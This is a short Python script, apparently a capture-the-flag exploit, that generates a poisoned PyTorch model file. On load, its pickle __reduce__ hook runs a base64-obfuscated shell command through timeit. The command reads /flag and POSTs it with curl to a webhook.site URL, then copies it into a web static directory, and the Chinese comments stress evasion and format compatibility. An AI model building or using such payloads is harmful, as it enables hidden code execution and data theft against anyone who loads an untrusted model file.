import torch
import sys
import pickle
import io

# CONFIGURATION
WEBHOOK_URL = "https://webhook.site/2836268e-59ee-4f9e-a0e7-8b02441c2a11" 
CMD = f"curl -X POST -d \"$(cat /flag)\" {WEBHOOK_URL}; cp /flag /app/static/flag.txt"

# 方案10: 
# 使用 torch.save 生成 ZIP 结构，但是我们的对象使用 "timeit" 技巧
# 这结合了 V4 (timeit) 的隐蔽性和 V9 (Zip格式) 的兼容性。

class MaliciousTimeit(object):
    def __reduce__(self):
        import timeit
        # timeit payload
        # 混淆 cmd 字符串
        import base64
        b64_cmd = base64.b64encode(CMD.encode()).decode()
        python_payload = f"__import__('os').system('echo {b64_cmd} | base64 -d | sh')"
        return (timeit.timeit, (python_payload, "pass", 1))

if __name__ == "__main__":
    filename = "nailong_payload_v10.pth"
    # 保存为 Zip 格式
    torch.save(MaliciousTimeit(), filename)
    print(f"[+] Generated {filename} using timeit in ZIP format")
